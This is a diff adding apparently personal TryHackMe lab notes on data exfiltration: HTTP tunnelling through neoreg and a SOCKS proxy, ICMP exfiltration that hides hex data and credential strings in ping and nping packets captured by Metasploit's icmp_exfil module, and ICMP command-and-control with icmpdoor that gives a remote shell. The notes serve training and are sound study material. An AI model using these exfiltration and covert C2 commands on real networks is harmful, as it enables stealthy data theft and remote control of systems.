@@ -74,3 +74,39 @@ python3 neoreg.py -k thm -u http://[IP]/uploader/files/tunnel.php
 curl --sock5 127.0.0.1:1080 http://[IP]/flag
 *THM{H77p_7unn3l1n9_l1k3_l337}
 
+-----------------------------------------------------------------------------------------------
+
+Exfiltration using ICMP
+-ICMP: internet control Message Protocol: network layer protocol used to handle error reporting
+-not a transport protocol
+-ICMP data section: can include strings or copies of other information (Optional data)
+-data included in optional data section and sent as an ICMP packet
+-use ping command
+ping [IP] -c 1
+-linux has optional -p argument specify 16 bytes of data in hex
+echo "thm:tryhackme" | xxd -p
+ping [IP] -c 1 -p 74686d3a7472796861636b6d650a
+-ICMP data exfiltration
+-look for Beginning of File(BOF) trigger value and End of File(EOF) trigger value
+-use metasploit framework
+msfconsole
+use auxiliary/server/icmp_exfil
+set BPF_FILTER icmp and not src [AttackBox IP]
+set INTERFACE eth0
+run
+-go to jump box
+ssh thm@icmp.thm.com
+sudo nping --icmp -c 1 [AttackBOx IP] --data-string "BOFfile.txt" 
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
+-attackbox
+-loot filename: /root/.msf4/loot/.....icmp_exfil_00000.txt
+
+ICMP C2 Communication
+thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
+thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
+shell: getFlag
+thm@icmp-host:~$ cd /tmp
+thm@icmp-host:/tmp$ cat flag.txt
+*THM{g0t-1cmp-p4k3t!}
